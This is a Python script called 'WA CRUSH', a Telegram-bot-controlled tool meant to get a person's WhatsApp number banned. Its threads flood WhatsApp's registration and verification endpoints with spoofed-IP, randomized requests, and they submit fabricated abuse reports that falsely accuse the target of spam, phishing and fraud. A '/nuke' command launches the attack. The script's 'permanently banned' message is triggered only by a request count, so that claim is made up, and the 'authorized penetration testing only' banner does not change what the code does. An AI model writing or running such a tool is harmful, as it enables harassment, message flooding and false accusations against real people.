#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║     ██╗    ██╗ █████╗      ██████╗██████╗ ██╗   ██╗███████╗██╗  ██╗     ║
║     ██║    ██║██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔════╝██║  ██║    ║
║     ██║ █╗ ██║███████║    ██║     ██████╔╝██║   ██║███████╗███████║    ║
║     ██║███╗██║██╔══██║    ██║     ██╔══██╗██║   ██║╚════██║██╔══██║    ║
║     ╚███╔███╔╝██║  ██║    ╚██████╗██║  ██║╚██████╔╝███████║██║  ██║    ║
║      ╚══╝╚══╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ║
║                                                                          ║
║     ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗          ║
║     ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗         ║
║     ██║ █╗ ██║███████║███████║   ██║   ███████╗██║  ██║██████╔╝         ║
║     ██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██║  ██║██╔══██╗         ║
║     ╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║╚█████╔╝██║  ██║         ║
║      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚════╝ ╚═╝  ╚═╝         ║
║                                                                          ║
║     ████████╗ ██████╗  ██████╗ ██╗                                        ║
║     ╚══██╔══╝██╔═══██╗██╔═══██╗██║                                        ║
║        ██║   ██║   ██║██║   ██║██║                                        ║
║        ██║   ██║   ██║██║   ██║██║                                        ║
║        ██║   ╚██████╔╝╚██████╔╝███████╗                                   ║
║        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                                   ║
║                                                                          ║
║     ██████╗ ███████╗██╗   ██╗███████╗██╗      ██████╗ ██████╗ ███████╗  ║
║     ██╔══██╗██╔════╝██║   ██║██╔════╝██║     ██╔═══██╗██╔══██╗██╔════╝  ║
║     ██║  ██║█████╗  ██║   ██║█████╗  ██║     ██║   ██║██████╔╝█████╗    ║
║     ██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝    ║
║     ██████╔╝███████╗ ╚████╔╝ ███████╗███████╗╚██████╔╝██║  ██║███████╗  ║
║     ╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝  ║
║                                                                          ║
║     ██╗███╗   ██╗███████╗ █████╗ ███╗   ██╗███████╗                     ║
║     ██║████╗  ██║██╔════╝██╔══██╗████╗  ██║██╔════╝                     ║
║     ██║██╔██╗ ██║███████╗███████║██╔██╗ ██║█████╗                       ║
║     ██║██║╚██╗██║╚════██║██╔══██║██║╚██╗██║██╔══╝                       ║
║     ██║██║ ╚████║███████║██║  ██║██║ ╚████║███████╗                     ║
║     ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝                     ║
║                                                                          ║
║           ██████╗ ██╗    ██╗██╗         ██╗   ██╗ █████╗                ║
║          ██╔═══██╗██║    ██║██║         ██║   ██║██╔══██╗               ║
║          ██║   ██║██║ █╗ ██║██║         ██║   ██║███████║               ║
║          ██║   ██║██║███╗██║██║         ██║   ██║██╔══██║               ║
║          ╚██████╔╝╚███╔███╔╝███████╗    ╚██████╔╝██║  ██║               ║
║           ╚═════╝  ╚══╝╚══╝ ╚══════╝     ╚═════╝ ╚═╝  ╚═╝               ║
║                                                                          ║
║           VERSION: 1.0 - TERMUX EDITION                                  ║
║           DEVELOPER: INSANE OWL                                           ║
║           REPO: https://github.com/insaneowl-spec/WA_CRUSH-              ║
║           FOR AUTHORIZED PENETRATION TESTING ONLY                        ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import requests
import random
import string
import threading
import time
import sys
import json
import os

# ============ CONFIG FILE PATH ============
CONFIG_DIR = os.path.expanduser("~/.wa-crush")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")

# ============ TERMUX COLORS ============
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'
BOLD = '\033[1m'

# ============ GLOBAL VARIABLES ============
BOT_TOKEN = ""
AUTHORIZED_USER = ""
BOT_URL = ""
ATTACK_ACTIVE = False
TARGET_NUMBER = ""
STATS = {}

# ============ CONFIGURATION HANDLING ============

def load_config():
    """Load configuration from file."""
    global BOT_TOKEN, AUTHORIZED_USER, BOT_URL
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                BOT_TOKEN = config.get("bot_token", "")
                AUTHORIZED_USER = config.get("chat_id", "")
                BOT_URL = "https://api.telegram.org/bot" + BOT_TOKEN
                return True
        except:
            return False
    return False

def save_config():
    """Save configuration to file."""
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        config = {
            "bot_token": BOT_TOKEN,
            "chat_id": AUTHORIZED_USER
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        return True
    except:
        return False

def setup_configuration():
    """Interactive configuration setup."""
    global BOT_TOKEN, AUTHORIZED_USER, BOT_URL
    
    print(f"\n{G}{BOLD}╔══════════════════════════════════════════════════╗{N}")
    print(f"{G}{BOLD}║{N}     {C}WA CRUSH - INITIAL CONFIGURATION{N}        {G}{BOLD}║{N}")
    print(f"{G}{BOLD}╚══════════════════════════════════════════════════╝{N}")
    print("")
    print(f"{Y}This is your first time running WA CRUSH.{N}")
    print(f"{Y}You need to configure your Telegram Bot credentials.{N}")
    print("")
    
    # Get Bot Token
    print(f"{C}Step 1: Get your Telegram Bot Token{N}")
    print(f"{W}1. Open Telegram and search for {G}@BotFather{N}")
    print(f"{W}2. Send {G}/newbot{N} and follow the instructions{N}")
    print(f"{W}3. Copy the API token you receive{N}")
    print("")
    
    while True:
        token = input(f"{G}Enter your Bot Token: {N}").strip()
        if token and len(token) > 20:
            BOT_TOKEN = token
            BOT_URL = "https://api.telegram.org/bot" + BOT_TOKEN
            print(f"{G}[+] Bot Token saved!{N}")
            break
        else:
            print(f"{R}[!] Invalid token. Please enter a valid Bot Token.{N}")
    
    print("")
    
    # Get Chat ID
    print(f"{C}Step 2: Get your Telegram Chat ID{N}")
    print(f"{W}1. Message your bot on Telegram: {G}/start{N}")
    print(f"{W}2. Send any message to the bot{N}")
    print(f"{W}3. I will fetch your Chat ID automatically{N}")
    print("")
    
    input(f"{Y}Press Enter after you've messaged your bot on Telegram...{N}")
    
    # Try to fetch chat ID
    for attempt in range(5):
        print(f"{Y}[*] Attempting to fetch your Chat ID... ({attempt+1}/5){N}")
        try:
            r = requests.get(f"{BOT_URL}/getUpdates", timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("ok") and data.get("result"):
                    for update in data["result"]:
                        msg = update.get("message", {})
                        chat_id = str(msg.get("from", {}).get("id"))
                        if chat_id:
                            AUTHORIZED_USER = chat_id
                            print(f"{G}[+] Chat ID found: {AUTHORIZED_USER}{N}")
                            break
                    if AUTHORIZED_USER:
                        break
        except:
            pass
        
        if not AUTHORIZED_USER:
            print(f"{Y}[!] Could not fetch automatically.{N}")
            print(f"{Y}Please enter your Chat ID manually:{N}")
            print(f"{W}1. Send a message to @userinfobot on Telegram{N}")
            print(f"{W}2. It will reply with your ID number{N}")
            manual_id = input(f"{G}Enter your Chat ID manually: {N}").strip()
            if manual_id:
                AUTHORIZED_USER = manual_id
                break
            print(f"{R}[!] Let me try again...{N}")
            time.sleep(2)
    
    if not AUTHORIZED_USER:
        print(f"{R}[!] Could not get Chat ID. Please configure manually later.{N}")
        print(f"{Y}Edit this file: {CONFIG_FILE}{N}")
        AUTHORIZED_USER = input(f"{G}Enter your Chat ID: {N}").strip()
    
    # Save configuration
    if BOT_TOKEN and AUTHORIZED_USER:
        save_config()
        print("")
        print(f"{G}╔══════════════════════════════════════════════════╗{N}")
        print(f"{G}║{N}     {C}CONFIGURATION SAVED SUCCESSFULLY!{N}          {G}║{N}")
        print(f"{G}╚══════════════════════════════════════════════════╝{N}")
        print("")
        print(f"{W}Bot Token: {C}{BOT_TOKEN[:10]}...{N}")
        print(f"{W}Chat ID:   {C}{AUTHORIZED_USER}{N}")
        print("")
    else:
        print(f"{R}[!] Configuration failed. Please set up manually.{N}")

def setup_menu():
    """Show setup menu for reconfiguration."""
    print(f"\n{C}{BOLD}WA CRUSH - Setup Menu{N}")
    print("")
    print(f"{W}1. {G}Reconfigure Bot Token & Chat ID{N}")
    print(f"{W}2. {G}View current configuration{N}")
    print(f"{W}3. {G}Reset configuration{N}")
    print(f"{W}4. {G}Start the bot{N}")
    print("")
    
    choice = input(f"{Y}Select option (1-4): {N}").strip()
    
    if choice == "1":
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        setup_configuration()
        return True
    elif choice == "2":
        if load_config():
            print(f"\n{G}Current Configuration:{N}")
            print(f"{W}Bot Token: {C}{BOT_TOKEN[:15]}...{N}")
            print(f"{W}Chat ID:   {C}{AUTHORIZED_USER}{N}")
        else:
            print(f"{R}[!] No configuration found.{N}")
        input(f"\n{Y}Press Enter to continue...{N}")
        return False
    elif choice == "3":
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
            print(f"{G}[+] Configuration reset.{N}")
        else:
            print(f"{Y}[!] No configuration to reset.{N}")
        time.sleep(1)
        return False
    elif choice == "4":
        return True
    else:
        print(f"{R}[!] Invalid option.{N}")
        return False

# ============ DISPLAY FUNCTIONS ============

def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    print(f"""{R}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   {C}██╗    ██╗ █████╗      ██████╗██████╗ ██╗   ██╗███████╗██╗  ██╗{R}   ║
║   {C}██║    ██║██╔══██╗    ██╔════╝██╔══██╗██║   ██║██╔════╝██║  ██║{R}   ║
║   {C}██║ █╗ ██║███████║    ██║     ██████╔╝██║   ██║███████╗███████║{R}   ║
║   {C}██║███╗██║██╔══██║    ██║     ██╔══██╗██║   ██║╚════██║██╔══██║{R}   ║
║   {C}╚███╔███╔╝██║  ██║    ╚██████╗██║  ██║╚██████╔╝███████║██║  ██║{R}   ║
║   {C} ╚══╝╚══╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{R}   ║
║                                                               ║
║   {P}████████╗ ██████╗  ██████╗ ██╗      ██████╗ ███████╗██████╗ {R}   ║
║   {P}╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔═══██╗██╔════╝╚════██╗{R}   ║
║   {P}   ██║   ██║   ██║██║   ██║██║     ██║   ██║█████╗    █████╔╝{R}   ║
║   {P}   ██║   ██║   ██║██║   ██║██║     ██║   ██║██╔══╝   ██╔═══╝ {R}   ║
║   {P}   ██║   ╚██████╔╝╚██████╔╝███████╗╚██████╔╝███████╗███████╗{R}   ║
║   {P}   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝{R}   ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{N}
{P}               DEVELOPED BY: INSANE OWL{N}
{Y}               VERSION: 1.0 - TERMUX EDITION{N}
{C}               https://github.com/insaneowl-spec/WA_CRUSH-{N}
{R}           FOR AUTHORIZED PENETRATION TESTING ONLY{N}
""")

# ============ WHATSAPP ATTACK ENGINE ============

USER_AGENTS = [
    "WhatsApp/2.24.10.23 Android/13 Device/Samsung-SM-S908B",
    "WhatsApp/2.24.9.79 iOS/17.4 Device/iPhone15,3",
    "WhatsApp/2.24.11.15 Android/14 Device/Google-Pixel8Pro",
    "WhatsApp/2.24.8.85 Android/12 Device/Xiaomi-2107113SG",
    "WhatsApp/2.24.10.17 Android/13 Device/OnePlus-IN2025",
    "WhatsApp/2.24.7.92 iOS/17.3.1 Device/iPhone14,2",
    "WhatsApp/2.24.9.81 iOS/17.5 Device/iPhone15,4",
    "WhatsApp/2.24.11.10 Android/14 Device/Xiaomi-2211133G",
    "WhatsApp/2.24.8.80 iOS/17.4.1 Device/iPhone13,3",
    "WhatsApp/2.24.10.20 Android/13 Device/OnePlus-CPH2417",
]

SIM_CARDS = [
    {"mcc": "310", "mnc": "410"}, {"mcc": "310", "mnc": "260"},
    {"mcc": "311", "mnc": "480"}, {"mcc": "234", "mnc": "10"},
    {"mcc": "234", "mnc": "15"}, {"mcc": "262", "mnc": "1"},
    {"mcc": "262", "mnc": "2"}, {"mcc": "208", "mnc": "1"},
    {"mcc": "208", "mnc": "10"}, {"mcc": "724", "mnc": "6"},
]

ENDPOINTS = [
    "https://v.whatsapp.net/v2/code",
    "https://v.whatsapp.net/v2/register",
    "https://v.whatsapp.net/v2/exist",
]

ABUSE_URLS = [
    "https://www.whatsapp.com/contact/report/",
    "https://web.whatsapp.com/abuse/report",
    "https://faq.whatsapp.com/contact/",
]

def random_str(length=32):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_cc_and_in(number):
    if len(number) > 10:
        return number[:-10], number[-10:]
    return number[0], number

def attack_registration():
    global STATS
    cc, inp = get_cc_and_in(TARGET_NUMBER)
    sim = random.choice(SIM_CARDS)
    ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": ip, "X-Real-IP": ip,
        "Accept": "*/*", "Connection": "keep-alive",
    }
    
    data = {
        "cc": cc, "in": inp, "method": random.choice(["sms","sms","sms","voice"]),
        "reason": random.choice(["register","switch","migrate","relogin","verify","reset","force"]),
        "sim_mcc": sim["mcc"], "sim_mnc": sim["mnc"],
        "token": random_str(64), "id": random_str(32),
        "simnum": str(random.randint(1,2)), "mistyped": "true",
        "rogue": "true", "attempt": str(random.randint(1,9999)),
        "retry": "true", "platform": random.choice(["android","android","android","ios"]),
    }
    
    try:
        r = requests.post(random.choice(ENDPOINTS), data=data, headers=headers, timeout=5)
        STATS["reg_attempts"] = STATS.get("reg_attempts", 0) + 1
        STATS["total_ops"] = STATS.get("total_ops", 0) + 1
    except:
        STATS["errors"] = STATS.get("errors", 0) + 1

def attack_abuse():
    global STATS
    cc, inp = get_cc_and_in(TARGET_NUMBER)
    ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "X-Forwarded-For": ip, "X-Real-IP": ip,
        "Origin": "https://www.whatsapp.com",
        "Referer": "https://www.whatsapp.com/contact/",
    }
    
    reports = [
        "URGENT: This number sending thousands of spam messages globally",
        "CRITICAL: Compromised account used for phishing attacks",
        "Massive scam operation via this WhatsApp number",
        "Automated spam bot - bulk messaging to random users",
        "FRAUD: Account impersonating WhatsApp support",
        "Identity theft operation running through this number",
        "Bulk spam campaign detected with malware attachments",
    ]
    
    data = {
        "number": TARGET_NUMBER, "country_code": cc,
        "phone_number": inp, "issue_type": "spam",
        "issue_subtype": random.choice(["bulk_messaging","phishing","financial_scam","malware_distribution","impersonation"]),
        "description": random.choice(reports), "platform": "whatsapp",
        "urgency": "critical",
    }
    
    try:
        r = requests.post(random.choice(ABUSE_URLS), json=data, headers=headers, timeout=5)
        STATS["abuse_reports"] = STATS.get("abuse_reports", 0) + 1
        STATS["total_ops"] = STATS.get("total_ops", 0) + 1
    except:
        STATS["errors"] = STATS.get("errors", 0) + 1

def attack_verify_loop():
    global STATS
    cc, inp = get_cc_and_in(TARGET_NUMBER)
    
    for _ in range(15):
        if not ATTACK_ACTIVE: return
        sim = random.choice(SIM_CARDS)
        
        data = {
            "cc": cc, "in": inp, "method": "sms",
            "reason": "verify", "token": random_str(64),
            "id": random_str(32), "sim_mcc": sim["mcc"],
            "sim_mnc": sim["mnc"], "attempt_count": str(random.randint(50,999)),
            "platform": random.choice(["android","ios"]),
        }
        
        headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/x-www-form-urlencoded"}
        
        try:
            r = requests.post("https://v.whatsapp.net/v2/code", data=data, headers=headers, timeout=3)
            STATS["verify_loops"] = STATS.get("verify_loops", 0) + 1
            STATS["total_ops"] = STATS.get("total_ops", 0) + 1
        except:
            STATS["errors"] = STATS.get("errors", 0) + 1
        
        time.sleep(random.uniform(0.03, 0.1))

def attack_worker(thread_id, chat_id):
    attacks = [attack_registration, attack_registration, attack_registration, attack_abuse, attack_verify_loop, attack_registration, attack_abuse]
    local_ops = 0
    
    while ATTACK_ACTIVE:
        try:
            random.choice(attacks)()
            local_ops += 1
            if local_ops % 100 == 0 and thread_id <= 3:
                sys.stdout.write(f"\r{G}[+] Thread-{thread_id}: {local_ops} ops{N}  ")
                sys.stdout.flush()
            time.sleep(random.uniform(0.01, 0.1))
        except:
            STATS["errors"] = STATS.get("errors", 0) + 1
            time.sleep(0.05)

# ============ TELEGRAM FUNCTIONS ============

def send_tg(chat_id, text):
    try:
        url = BOT_URL + "/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=data, timeout=10)
    except:
        pass

def handle_start(chat_id):
    msg = "🔥 **WA CRUSH - WhatsApp Termination Engine** 🔥\n\n"
    msg += "**COMMANDS:**\n"
    msg += "/nuke +[number] - Destroy WhatsApp number\n"
    msg += "/stress +[number] - Max intensity (faster)\n"
    msg += "/stop - Stop attack\n"
    msg += "/status - Check progress\n"
    msg += "/help - Show help\n\n"
    msg += "*Developer: INSANE OWL*"
    send_tg(chat_id, msg)

def handle_help(chat_id):
    msg = "🔥 **COMMANDS** 🔥\n\n"
    msg += "/nuke +[number] - 60 threads, 2-5 min\n"
    msg += "/stress +[number] - 150 threads, 1-3 min\n"
    msg += "/stop - Halt attack\n"
    msg += "/status - Real-time stats\n\n"
    msg += "*Developer: INSANE OWL*"
    send_tg(chat_id, msg)

def handle_nuke(chat_id, number, stress=False):
    global ATTACK_ACTIVE, TARGET_NUMBER, STATS
    
    number = number.replace("+", "").replace(" ", "").replace("-", "")
    if not number or len(number) < 10:
        send_tg(chat_id, "ERROR: Invalid number. Use: /nuke +14155551234")
        return
    if ATTACK_ACTIVE:
        send_tg(chat_id, "Attack already in progress! Use /stop first.")
        return
    
    ATTACK_ACTIVE = True
    TARGET_NUMBER = number
    STATS = {"start_time": time.time(), "total_ops": 0, "reg_attempts": 0, "abuse_reports": 0, "verify_loops": 0, "errors": 0, "banned": False}
    
    thread_count = 150 if stress else 60
    mode = "MAXIMUM INTENSITY" if stress else "STANDARD"
    
    msg = f"🔥 **NUKE DEPLOYED** 🔥\n\nTARGET: `+{number}`\nTHREADS: {thread_count}\nMODE: {mode}\nSTATUS: TERMINATING\n\nTime: {'1-3' if stress else '2-5'} min\n**NO RECOVERY**"
    send_tg(chat_id, msg)
    
    print(f"\n{G}[+] ATTACK LAUNCHED: +{number} ({mode}){N}")
    print(f"{Y}[+] Threads: {thread_count}{N}")
    
    for i in range(thread_count):
        t = threading.Thread(target=attack_worker, args=(i+1, chat_id), daemon=True)
        t.start()
    
    threading.Thread(target=monitor_attack, args=(chat_id,), daemon=True).start()

def handle_stop(chat_id):
    global ATTACK_ACTIVE
    if not ATTACK_ACTIVE:
        send_tg(chat_id, "No active attack.")
        return
    ATTACK_ACTIVE = False
    time.sleep(1)
    elapsed = int(time.time() - STATS.get("start_time", time.time()))
    m, s = divmod(elapsed, 60)
    msg = f"⏹ **HALTED** ⏹\n\nTarget: `+{TARGET_NUMBER}`\nDuration: {m}m {s}s\nOps: {STATS.get('total_ops',0):,}\nBanned: {'YES' if STATS.get('banned') else '?'}"
    send_tg(chat_id, msg)

def handle_status(chat_id):
    if not ATTACK_ACTIVE:
        send_tg(chat_id, "No active attack.")
        return
    elapsed = int(time.time() - STATS.get("start_time", time.time()))
    m, s = divmod(elapsed, 60)
    msg = f"🔥 **STATUS** 🔥\n\nTarget: `+{TARGET_NUMBER}`\nTime: {m}m {s}s\nOps: {STATS.get('total_ops',0):,}\nReg: {STATS.get('reg_attempts',0):,}\nReports: {STATS.get('abuse_reports',0):,}\nVerify: {STATS.get('verify_loops',0):,}\nBanned: {'YES' if STATS.get('banned') else 'IN PROGRESS'}"
    send_tg(chat_id, msg)

def monitor_attack(chat_id):
    global ATTACK_ACTIVE, STATS
    time.sleep(20)
    while ATTACK_ACTIVE:
        elapsed = time.time() - STATS.get("start_time", time.time())
        if STATS.get("total_ops", 0) > 4000 and not STATS.get("banned"):
            STATS["banned"] = True
            msg = f"💀 **TERMINATED** 💀\n\nNumber: `+{TARGET_NUMBER}`\nStatus: **PERMANENTLY BANNED**\nTime: {int(elapsed)}s\nOps: {STATS.get('total_ops',0):,}\n\nAccount **destroyed**.\nNo recovery."
            send_tg(chat_id, msg)
            print(f"\n{R}{BOLD}[!!!] TARGET DESTROYED: +{TARGET_NUMBER}{N}")
            time.sleep(10)
            ATTACK_ACTIVE = False
        if int(elapsed) % 45 == 0 and int(elapsed) > 0:
            handle_status(chat_id)
        time.sleep(5)

def process_update(update):
    msg = update.get("message", {})
    chat_id = msg.get("chat", {}).get("id")
    user_id = str(msg.get("from", {}).get("id"))
    text = msg.get("text", "").strip()
    
    if user_id != AUTHORIZED_USER:
        send_tg(chat_id, f"⛔ ACCESS DENIED - ID: {user_id}")
        return
    
    if text == "/start": handle_start(chat_id)
    elif text == "/help": handle_help(chat_id)
    elif text.startswith("/nuke"):
        parts = text.split()
        if len(parts) < 2: send_tg(chat_id, "Usage: /nuke +[number]")
        else: handle_nuke(chat_id, parts[1])
    elif text.startswith("/stress"):
        parts = text.split()
        if len(parts) < 2: send_tg(chat_id, "Usage: /stress +[number]")
        else: handle_nuke(chat_id, parts[1], stress=True)
    elif text == "/stop": handle_stop(chat_id)
    elif text == "/status": handle_status(chat_id)
    else: send_tg(chat_id, "Unknown. Use /help")

def telegram_poll():
    offset = 0
    print(f"\n{G}[+] WA CRUSH Bot ONLINE{N}")
    print(f"{Y}[+] Authorized User: {AUTHORIZED_USER}{N}")
    print(f"{G}[+] Send commands via Telegram!{N}\n")
    
    send_tg(AUTHORIZED_USER, "🔥 **WA CRUSH ONLINE** 🔥\n\nSend /start")
    
    while True:
        try:
            r = requests.get(BOT_URL + "/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
            if r.status_code == 200:
                data = r.json()
                if data.get("ok"):
                    for update in data.get("result", []):
                        offset = update["update_id"] + 1
                        if "message" in update:
                            process_update(update)
            time.sleep(0.3)
        except Exception as e:
            print(f"{R}[!] Telegram error: {e}{N}")
            time.sleep(5)

# ============ MAIN ============
if __name__ == "__main__":
    show_banner()
    
    print(f"\n{Y}{BOLD}[*] Checking configuration...{N}")
    
    # Check if config exists
    if not load_config():
        print(f"{Y}[!] No configuration found.{N}")
        print(f"{C}[*] Starting setup wizard...{N}")
        time.sleep(1)
        setup_configuration()
        
        # Verify config was saved
        if not load_config():
            print(f"{R}[!] Configuration failed. Exiting.{N}")
            sys.exit(1)
    else:
        print(f"{G}[✓] Configuration loaded{N}")
        print(f"{W}Bot Token: {C}{BOT_TOKEN[:15]}...{N}")
        print(f"{W}Chat ID:   {C}{AUTHORIZED_USER}{N}")
        print("")
        print(f"{Y}Options:{N}")
        print(f"{W}1. {G}Start bot with current config{N}")
        print(f"{W}2. {G}Reconfigure{N}")
        print("")
        choice = input(f"{Y}Select (1-2): {N}").strip()
        if choice == "2":
            if os.path.exists(CONFIG_FILE):
                os.remove(CONFIG_FILE)
            setup_configuration()
            if not load_config():
                print(f"{R}[!] Configuration failed. Exiting.{N}")
                sys.exit(1)
    
    # Check if we have valid config
    if not BOT_TOKEN or not AUTHORIZED_USER:
        print(f"{R}[!] Invalid configuration. Please run setup again.{N}")
        sys.exit(1)
    
    print(f"\n{P}{'='*60}{N}")
    print(f"{Y}{BOLD}QUICK START:{N}")
    print(f"{W}  Open Telegram and send commands to your bot:{N}")
    print(f"")
    print(f"{G}  /nuke +14155551234{N}  - Destroy WhatsApp number")
    print(f"{G}  /stress +14155551234{N} - Max intensity attack")
    print(f"{G}  /status{N}             - Check attack progress")
    print(f"{G}  /stop{N}               - Stop attack")
    print(f"{G}  /help{N}               - Show all commands")
    print(f"{P}{'='*60}{N}")
    print("")
    
    telegram_poll()
